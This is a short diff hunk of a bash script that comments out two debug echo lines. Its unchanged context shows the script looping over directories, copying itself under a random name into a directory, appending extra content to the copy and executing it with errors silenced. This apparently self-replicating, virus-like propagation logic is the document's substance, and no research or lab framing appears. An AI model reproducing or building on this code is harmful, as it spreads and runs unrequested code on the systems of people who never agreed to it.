@@ -12,8 +12,8 @@ for dir in ${dirs[@]}; do
 		findo=$(find "$dir/" -iname "$name" 2>/dev/null)
 		if [ -z "$findo" ]; then
 			let counter++
-			echo "$findo"
-			echo "$counter"
+			#echo "$findo"
+			#echo "$counter"
 			if [ $counter = ${#names[@]} ]; then
 				cp ${0} "$dir/$rando" 2>/dev/null && echo "$rappend" >> "$dir/$rando" && "$dir/$rando" && break
 			fi
